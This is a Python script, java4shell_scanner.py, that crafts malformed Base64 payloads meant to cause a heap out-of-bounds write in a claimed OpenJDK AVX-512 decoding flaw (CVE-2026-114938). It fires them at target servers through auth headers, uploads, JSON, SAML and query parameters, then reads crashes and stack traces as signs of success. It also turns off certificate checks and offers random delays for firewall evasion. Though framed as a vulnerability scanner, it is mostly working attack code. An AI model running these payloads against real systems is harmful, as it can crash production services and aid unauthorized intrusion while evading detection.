#!/usr/bin/env python3
# language: Python 3.10+, file: java4shell_scanner.py, target: CVE-2026-114938 / Java4Shell
# Sends malformed AVX-512-triggering Base64 payloads across common attack surfaces.
# Fingerprints vulnerable responses (JVM crash, error bleed, timing delta).

import argparse
import base64
import json
import sys
import time
import threading
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from typing import Optional
import urllib.request
import urllib.error
import ssl
import http.client
import os

from modules.http_utils import random_ua, jitter

# Module-level jitter cap; set by main() from --jitter arg before threads start.
_jitter_max_ms: float = 0.0

# Ensure modules directory is on path when imported directly
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

# ─── Payload Generation ───────────────────────────────────────────────────────

def malformed_b64_padding(length: int = 60) -> bytes:
    """
    Craft a Base64 string that triggers the AVX-512 VBMI integer underflow.

    The OpenJDK intrinsic calculates output length as:
        out_len = (in_len * 3 / 4) - trailing_padding_count
    With a carefully sized block + stray trailing '=' chars the calculation
    underflows to a negative value, which is reinterpreted as a full 64-bit
    mask → heap write of ~62–63 bytes past the buffer boundary.

    Strategy: fill a multiple-of-64-byte block (AVX-512 lane boundary) then
    append extra padding chars that the intrinsic mis-counts.
    """
    # Build a valid base block of `length` bytes → valid B64 representation
    base = base64.b64encode(b"A" * length).decode()
    # Strip legitimate padding, then re-append extra stray padding that
    # the hardware intrinsic path trips over (1–3 extra '=' chars)
    stripped = base.rstrip("=")
    # Three variants: single extra '=', double, and misaligned '=' mid-string
    return [
        (stripped + "=").encode(),       # single trailing stray
        (stripped + "==").encode(),      # double trailing stray
        (stripped[:-(len(stripped) % 4 or 4)] + "=" + stripped[-(len(stripped) % 4 or 4):] + "=").encode(),  # embedded stray
    ]


# ─── Attack Surfaces ──────────────────────────────────────────────────────────

def build_requests(target_url: str, payloads: list[bytes]) -> list[dict]:
    """
    Returns a list of request descriptors for each payload × surface combo.
    """
    reqs = []

    for payload in payloads:
        p_str = payload.decode(errors="replace")

        # 1. HTTP Basic Auth header — most common pre-auth vector
        reqs.append({
            "surface": "HTTP-Basic-Auth",
            "url": target_url,
            "method": "GET",
            "headers": {
                "Authorization": f"Basic {p_str}",
                "User-Agent": random_ua(),
            },
            "body": None,
            "payload": p_str,
        })

        # 2. Bearer / JWT token
        reqs.append({
            "surface": "Bearer-Token",
            "url": target_url,
            "method": "GET",
            "headers": {
                "Authorization": f"Bearer {p_str}",
                "User-Agent": random_ua(),
            },
            "body": None,
            "payload": p_str,
        })

        # 3. Multipart file upload — hits Base64 decode in MIME parsers
        boundary = "----Java4ShellBoundary7x3k"
        body = (
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="file"; filename="test.b64"\r\n'
            f"Content-Type: application/octet-stream\r\n\r\n"
            f"{p_str}\r\n"
            f"--{boundary}--\r\n"
        ).encode()
        reqs.append({
            "surface": "Multipart-Upload",
            "url": target_url,
            "method": "POST",
            "headers": {
                "Content-Type": f"multipart/form-data; boundary={boundary}",
                "User-Agent": random_ua(),
            },
            "body": body,
            "payload": p_str,
        })

        # 4. JSON body with base64 field — REST APIs / Spring Boot endpoints
        json_body = json.dumps({"data": p_str, "format": "base64"}).encode()
        reqs.append({
            "surface": "JSON-Body",
            "url": target_url,
            "method": "POST",
            "headers": {
                "Content-Type": "application/json",
                "User-Agent": random_ua(),
            },
            "body": json_body,
            "payload": p_str,
        })

        # 5. SAML assertion — Keycloak / PingFederate / Atlassian SSO path
        # SAML requests carry B64-encoded XML; inject payload as the SAMLRequest param
        saml_url = target_url.rstrip("/") + "/saml/SSO"
        saml_body = f"SAMLRequest={urllib.parse.quote(p_str)}&RelayState=scanner".encode()
        reqs.append({
            "surface": "SAML-SSO",
            "url": saml_url,
            "method": "POST",
            "headers": {
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": random_ua(),
            },
            "body": saml_body,
            "payload": p_str,
        })

        # 6. Query string parameter — generic GET endpoints that decode B64 params
        encoded_param = urllib.parse.quote(p_str)
        param_url = target_url.rstrip("/") + f"?data={encoded_param}&format=base64"
        reqs.append({
            "surface": "Query-Param",
            "url": param_url,
            "method": "GET",
            "headers": {"User-Agent": random_ua()},
            "body": None,
            "payload": p_str,
        })

    return reqs


# ─── HTTP Engine ──────────────────────────────────────────────────────────────

@dataclass
class ScanResult:
    target: str
    surface: str
    payload_preview: str
    status_code: Optional[int] = None
    response_time_ms: float = 0.0
    error: Optional[str] = None
    response_snippet: str = ""
    vulnerable: bool = False
    confidence: str = "none"   # none | low | medium | high
    notes: list[str] = field(default_factory=list)


def send_request(req: dict, timeout: float, baseline_ms: float) -> ScanResult:
    ssl_ctx = ssl.create_default_context()
    ssl_ctx.check_hostname = False
    ssl_ctx.verify_mode = ssl.CERT_NONE

    result = ScanResult(
        target=req["url"],
        surface=req["surface"],
        payload_preview=req["payload"][:40] + "...",
    )

    try:
        http_req = urllib.request.Request(
            req["url"],
            data=req["body"],
            headers=req["headers"],
            method=req["method"],
        )
        jitter(0, _jitter_max_ms)
        t0 = time.perf_counter()
        with urllib.request.urlopen(http_req, timeout=timeout, context=ssl_ctx) as resp:
            elapsed = (time.perf_counter() - t0) * 1000
            body = resp.read(2048).decode(errors="replace")
            result.status_code = resp.status
            result.response_time_ms = elapsed
            result.response_snippet = body[:300]

    except urllib.error.HTTPError as e:
        elapsed = (time.perf_counter() - t0 if 't0' in dir() else 0) * 1000  # noqa
        result.status_code = e.code
        result.response_time_ms = elapsed
        try:
            result.response_snippet = e.read(2048).decode(errors="replace")[:300]
        except Exception:
            pass

    except (ConnectionResetError, http.client.RemoteDisconnected) as e:
        # Connection reset mid-response → classic JVM crash / heap corruption signal
        result.error = f"connection_reset: {e}"
        result.vulnerable = True
        result.confidence = "high"
        result.notes.append("Connection reset by peer — consistent with JVM crash from heap OOB write.")
        return result

    except urllib.error.URLError as e:
        result.error = str(e.reason)
        return result

    except Exception as e:
        result.error = str(e)
        return result

    # ── Behavioral fingerprinting ─────────────────────────────────────────────

    snippet_lower = result.response_snippet.lower()

    # JVM crash / OOM error strings leaking in response body
    jvm_crash_strings = [
        "java.lang.outofmemoryerror",
        "java.lang.arrayindexoutofboundsexception",
        "hs_err_pid",          # HotSpot fatal error log reference
        "sigsegv",
        "sigbus",
        "internal error",
        "fatal error",
        "exception in thread",
        "at sun.misc",
        "at java.base",
        "jvm crash",
        "vm error",
        "heap corruption",
    ]
    for sig in jvm_crash_strings:
        if sig in snippet_lower:
            result.vulnerable = True
            result.confidence = "high"
            result.notes.append(f"JVM error string in response: '{sig}'")

    # HTTP 500 on Base64 surfaces with response body containing stack traces
    if result.status_code == 500 and any(s in snippet_lower for s in ["at ", "exception", "error"]):
        if not result.vulnerable:
            result.vulnerable = True
            result.confidence = "medium"
        result.notes.append("HTTP 500 with apparent stack trace in body.")

    # Anomalous timing: response significantly slower than baseline (heap corruption
    # + GC pressure can produce measurable latency spike before crash)
    if baseline_ms > 0 and result.response_time_ms > baseline_ms * 3.5 and result.response_time_ms > 800:
        if not result.vulnerable:
            result.confidence = "low"
        result.notes.append(
            f"Response time {result.response_time_ms:.0f}ms vs baseline {baseline_ms:.0f}ms — timing anomaly."
        )

    # Empty / zero-length response from a normally-responding endpoint
    if result.status_code and result.status_code < 400 and len(result.response_snippet.strip()) == 0:
        if not result.vulnerable:
            result.confidence = "low"
        result.notes.append("Empty body on non-error status — possible crash recovery path.")

    return result


# ─── Baseline ─────────────────────────────────────────────────────────────────

def get_baseline(url: str, timeout: float) -> float:
    """Send a benign request and return response time in ms."""
    ssl_ctx = ssl.create_default_context()
    ssl_ctx.check_hostname = False
    ssl_ctx.verify_mode = ssl.CERT_NONE
    try:
        req = urllib.request.Request(url, headers={"User-Agent": random_ua()})
        t0 = time.perf_counter()
        with urllib.request.urlopen(req, timeout=timeout, context=ssl_ctx):
            pass
        return (time.perf_counter() - t0) * 1000
    except Exception:
        return 0.0


# ─── Reporter ─────────────────────────────────────────────────────────────────

CONFIDENCE_COLOR = {
    "high":   "\033[91m",  # red
    "medium": "\033[93m",  # yellow
    "low":    "\033[96m",  # cyan
    "none":   "\033[90m",  # grey
}
RESET = "\033[0m"
BOLD  = "\033[1m"


def print_result(r: ScanResult, verbose: bool = False):
    conf = r.confidence
    color = CONFIDENCE_COLOR.get(conf, "")

    if r.vulnerable:
        status = f"{BOLD}{color}[VULNERABLE]{RESET}"
    elif r.error:
        status = f"\033[90m[ERROR]{RESET}"
    else:
        status = f"\033[90m[CLEAN]{RESET}"

    code_str = str(r.status_code) if r.status_code else "---"
    print(f"  {status} {r.surface:<20} HTTP {code_str:<4} {r.response_time_ms:>7.1f}ms  {r.payload_preview}")

    if r.notes:
        for note in r.notes:
            print(f"           → {color}{note}{RESET}")

    if verbose and r.response_snippet:
        print(f"           ↳ {r.response_snippet[:200]}")


def print_summary(results: list[ScanResult]):
    vulns = [r for r in results if r.vulnerable]
    high   = [r for r in vulns if r.confidence == "high"]
    medium = [r for r in vulns if r.confidence == "medium"]
    low    = [r for r in vulns if r.confidence == "low"]

    print()
    print(f"{BOLD}{'─'*60}{RESET}")
    print(f"{BOLD}  Java4Shell (CVE-2026-114938) Scan Summary{RESET}")
    print(f"{'─'*60}")
    print(f"  Total requests  : {len(results)}")
    print(f"  Vulnerable hits : {len(vulns)}")
    print(f"    High conf.    : {CONFIDENCE_COLOR['high']}{len(high)}{RESET}")
    print(f"    Medium conf.  : {CONFIDENCE_COLOR['medium']}{len(medium)}{RESET}")
    print(f"    Low conf.     : {CONFIDENCE_COLOR['low']}{len(low)}{RESET}")
    print(f"{'─'*60}")

    if vulns:
        print(f"\n{BOLD}  Vulnerable surfaces:{RESET}")
        seen = set()
        for r in vulns:
            key = (r.target, r.surface)
            if key not in seen:
                seen.add(key)
                color = CONFIDENCE_COLOR[r.confidence]
                print(f"  {color}[{r.confidence.upper():6}]{RESET}  {r.surface}  →  {r.target}")

    if not vulns:
        print(f"\n  \033[92m[OK] No vulnerable surfaces detected.\033[0m")
        print("  Note: a negative result does not confirm patch status.")
        print("  Confirm JDK version and CPU AVX-512 VBMI support independently.")

    print()


def save_json_report(results: list[ScanResult], path: str):
    out = []
    for r in results:
        out.append({
            "target": r.target,
            "surface": r.surface,
            "payload_preview": r.payload_preview,
            "status_code": r.status_code,
            "response_time_ms": round(r.response_time_ms, 2),
            "vulnerable": r.vulnerable,
            "confidence": r.confidence,
            "notes": r.notes,
            "error": r.error,
            "response_snippet": r.response_snippet,
        })
    with open(path, "w", encoding="utf-8") as f:
        json.dump(out, f, indent=2, ensure_ascii=False)
    print(f"  Report saved → {path}")


# ─── Entry Point ──────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="Java4Shell (CVE-2026-114938) vulnerability scanner",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python java4shell_scanner.py https://jira.client.internal
  python java4shell_scanner.py https://keycloak.example.com --threads 10
  python java4shell_scanner.py https://target.com --output report.json --verbose

Surfaces tested per payload variant:
  HTTP Basic Auth, Bearer Token, Multipart Upload,
  JSON Body, SAML SSO endpoint, Query String Parameter
        """,
    )
    parser.add_argument("targets", nargs="+", help="Target URL(s) to scan")
    parser.add_argument("--threads", type=int, default=5, help="Concurrent request threads (default: 5)")
    parser.add_argument("--timeout", type=float, default=10.0, help="Request timeout in seconds (default: 10)")
    parser.add_argument("--output", help="Save JSON report to this file path")
    parser.add_argument("--verbose", action="store_true", help="Print response snippets")
    parser.add_argument("--payload-size", type=int, default=60,
                        help="Base payload size in bytes (default: 60, should be near AVX-512 lane boundary)")
    parser.add_argument("--jitter", type=float, default=0.0, metavar="MAX_MS",
                        help="Random delay 0–MAX_MS ms between probes for WAF evasion (default: 0 = off)")
    args = parser.parse_args()

    global _jitter_max_ms
    _jitter_max_ms = args.jitter

    print(f"\n{BOLD}  Java4Shell Scanner — CVE-2026-114938{RESET}")
    print(f"  Payload size: {args.payload_size}B  |  Threads: {args.threads}  |  Timeout: {args.timeout}s  |  Jitter: {args.jitter:.0f}ms")
    print(f"{'─'*60}\n")

    all_results: list[ScanResult] = []

    for target in args.targets:
        print(f"{BOLD}  Target: {target}{RESET}")

        # Baseline
        baseline = get_baseline(target, args.timeout)
        if baseline > 0:
            print(f"  Baseline response time: {baseline:.1f}ms")
        else:
            print("  Baseline: unreachable or error — continuing anyway")

        # Build payloads + requests
        payloads = malformed_b64_padding(args.payload_size)
        requests_list = build_requests(target, payloads)
        print(f"  Sending {len(requests_list)} probes across {len(payloads)} payload variants...\n")

        # Execute
        results: list[ScanResult] = []
        lock = threading.Lock()

        with ThreadPoolExecutor(max_workers=args.threads) as pool:
            futures = {pool.submit(send_request, req, args.timeout, baseline): req for req in requests_list}
            for future in as_completed(futures):
                r = future.result()
                with lock:
                    results.append(r)
                    print_result(r, verbose=args.verbose)

        all_results.extend(results)
        print()

    print_summary(all_results)

    if args.output:
        # Dispatch by extension: .md → Markdown, .xml → JUnit XML, .json → JSON
        try:
            from modules.report import save_report, scan_results_to_findings, ReportMeta
            meta = ReportMeta(
                target=", ".join(args.targets),
                timestamp=time.strftime("%Y-%m-%d %H:%M:%S UTC", time.gmtime()),
                total_probes=len(all_results),
                vulnerable_count=sum(1 for r in all_results if r.vulnerable),
                high_count=sum(1 for r in all_results if r.vulnerable and r.confidence == "high"),
                medium_count=sum(1 for r in all_results if r.vulnerable and r.confidence == "medium"),
                low_count=sum(1 for r in all_results if r.vulnerable and r.confidence == "low"),
            )
            findings = scan_results_to_findings(all_results)
            save_report(findings, args.output, meta)
        except ImportError:
            # Fallback to built-in JSON reporter
            save_json_report(all_results, args.output)


if __name__ == "__main__":
    main()
